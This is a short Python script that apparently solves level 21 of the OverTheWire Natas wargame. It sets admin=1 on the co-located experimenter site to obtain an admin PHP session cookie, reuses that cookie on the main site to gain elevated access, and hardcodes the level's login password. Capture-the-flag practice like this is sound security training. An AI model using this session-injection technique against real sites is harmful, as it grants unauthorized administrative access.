import requests, re
u='natas21'
p='IFekPyrQXftziDEsUr3x21sYuahypdgJ'
l=f'http://{u}.natas.labs.overthewire.org/?debug=true'
col='http://natas21-experimenter.natas.labs.overthewire.org/?debug=true&admin=1&submit=1'
sid=requests.get(col,auth=(u, p)).cookies["PHPSESSID"]
resp=requests.get(l,auth=(u, p),cookies={"PHPSESSID":sid})
print(resp.text)
